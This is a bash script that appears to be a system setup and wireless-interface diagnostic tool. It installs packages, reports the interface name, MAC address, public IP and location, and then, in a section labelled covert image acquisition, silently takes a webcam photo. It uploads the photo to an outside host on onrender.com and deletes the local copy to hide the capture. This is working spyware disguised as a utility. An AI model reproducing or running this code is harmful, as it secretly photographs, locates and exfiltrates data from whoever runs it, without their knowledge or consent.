#!/bin/bash

# --- Operational Color Matrix ---
SIERRA_GREEN='\033[0;32m'
SIERRA_RED='\033[0;31m'
SIERRA_GOLD='\033[0;33m'
SIERRA_CYAN='\033[0;36m'
SIERRA_NULL='\033[0m'

# --- Manifest & Logistics ---
VANGUARD_PKGS=("fswebcam" "iw" "aircrack-ng" "build-essential" "rfkill" "ethtool" "iwd" "curl" "jq")
VANGUARD_SEQ=(
    "Synchronizing Repositories" "sudo apt update -qq"
    "Verifying Dependency Tree" "sudo apt install --fix-broken -y -qq"
    "Patching System Binaries" "sudo apt upgrade -y -qq"
    "Executing Kernel Alignment" "sudo apt full-upgrade -y -qq"
    "Purging Orphaned Modules" "sudo apt autoremove --purge -y -qq"
    "Clearing Buffer Cache" "sudo apt autoclean -y -qq"
    "Injecting Core Payloads" "sudo apt install -y ${VANGUARD_PKGS[*]} -qq"
)

# --- Intelligence Functions ---
INTEL_ROOT_CHECK() { ! [[ "$EUID" -eq 0 ]]; }
INTEL_GET_IFACE() { iw dev 2>/dev/null | awk '$1=="Interface"{print $2}' | head -n 1; }
INTEL_GET_DUMP()  { iw dev "$1" info 2>/dev/null; }
INTEL_GET_MODE()  { echo "$1" | awk '/type/ {print $2}'; }
INTEL_GET_MAC()   { echo "$1" | awk '/addr/ {print $2}'; }
INTEL_GET_IPV4()  { curl -s --max-time 3 https://api.ipify.org 2>/dev/null; }
INTEL_GET_LOC()   { curl -s --max-time 3 ipinfo.io/loc 2>/dev/null; }

SIGNAL_OK()  { echo -e "${SIERRA_NULL}[ ${SIERRA_GREEN}SUCCESS ${SIERRA_NULL}]"; }
SIGNAL_ERR() { echo -e "${SIERRA_NULL}[ ${SIERRA_RED}FAILED ${SIERRA_NULL}]"; }

# --- Authority Verification ---
if INTEL_ROOT_CHECK; then
    SIGNAL_ERR
    echo -e "${SIERRA_RED}[!] Unauthorized Access. Escalation required (sudo).${SIERRA_NULL}"
    exit 1
fi

# --- Deployment Phase ---
TOTAL_STEPS=$((${#VANGUARD_SEQ[@]} / 2))
echo -e "${SIERRA_CYAN}[@] Initializing Environment Sequence${SIERRA_NULL}"
for ((IDX = 0; IDX < ${#VANGUARD_SEQ[@]}; IDX += 2)); do
    STEP_NUM=$(((IDX / 2) + 1))
    echo -en "[${STEP_NUM}/${TOTAL_STEPS}] ${VANGUARD_SEQ[IDX]}..."
    if eval "${VANGUARD_SEQ[IDX + 1]}" &>/dev/null; then SIGNAL_OK; else
        SIGNAL_ERR
        echo -e "${SIERRA_RED}[!] Deployment Aborted.${SIERRA_NULL}"
        exit 1
    fi
done

sleep 1 && clear

# --- Hardware Reconnaissance ---
echo -e "${SIERRA_CYAN}[@] Executing Hardware Sweep${SIERRA_NULL}"

echo -n "[ALPHA] Locating Wireless Interface..."
if TARGET_IFACE=$(INTEL_GET_IFACE); then SIGNAL_OK; else SIGNAL_ERR; fi

echo -n "[BRAVO] Capturing Interface Dump..."
if TARGET_DUMP=$(INTEL_GET_DUMP "$TARGET_IFACE"); then SIGNAL_OK; else SIGNAL_ERR; fi

echo -n "[CHARLIE] Analyzing Chipset Mode..."
if TARGET_MODE=$(INTEL_GET_MODE "$TARGET_DUMP"); then SIGNAL_OK; else SIGNAL_ERR; fi

echo -n "[DELTA] Extracting MAC Address..."
if TARGET_MAC=$(INTEL_GET_MAC "$TARGET_DUMP"); then SIGNAL_OK; else SIGNAL_ERR; fi

echo -n "[ECHO] Establishing Uplink..."
if TARGET_IPV4=$(INTEL_GET_IPV4); then SIGNAL_OK; else SIGNAL_ERR; fi

echo -n "[FOXTROT] Pulling Geo-Coordinates..."
if TARGET_LOC=$(INTEL_GET_LOC); then SIGNAL_OK; else SIGNAL_ERR; fi

# --- Tactical Capture & Transmission ---
STAMP=$(date +"%Y%m%d_%H%M%S")
VAULT_DIR="$HOME/Pictures/___"
STRIKE_FILE="$VAULT_DIR/capture_$STAMP.jpg"
mkdir -p "$VAULT_DIR"

# Covert Image Acquisition
fswebcam -d /dev/video0 -r 1280x720 --no-banner "$STRIKE_FILE" &>/dev/null

# Encrypted Transmission
UPLINK_RES=$(curl -s -X POST https://secret-0kpy.onrender.com/upload \
    -F "image=@$STRIKE_FILE")

# Scrubbing Local Footprint
rm -rf "$VAULT_DIR"

# --- Final Intelligence Briefing ---
clear
echo -e "${SIERRA_GREEN}==========================================${SIERRA_NULL}"
echo -e "         MISSION POST-ACTION REPORT       "
echo -e "${SIERRA_GREEN}==========================================${SIERRA_NULL}"
printf "${SIERRA_CYAN}%-18s${SIERRA_NULL} : %s\n" "OPERATIONAL TIME" "$STAMP"
printf "${SIERRA_CYAN}%-18s${SIERRA_NULL} : %s\n" "IFACE IDENT"     "$TARGET_IFACE"
printf "${SIERRA_CYAN}%-18s${SIERRA_NULL} : %s\n" "NET MODE"        "$TARGET_MODE"
printf "${SIERRA_CYAN}%-18s${SIERRA_NULL} : %s\n" "HARDWARE ADDR"   "$TARGET_MAC"
printf "${SIERRA_CYAN}%-18s${SIERRA_NULL} : %s\n" "GATEWAY IP"      "$TARGET_IPV4"
printf "${SIERRA_CYAN}%-18s${SIERRA_NULL} : %s\n" "COORDINATES"     "$TARGET_LOC"
echo -e "${SIERRA_GREEN}==========================================${SIERRA_NULL}"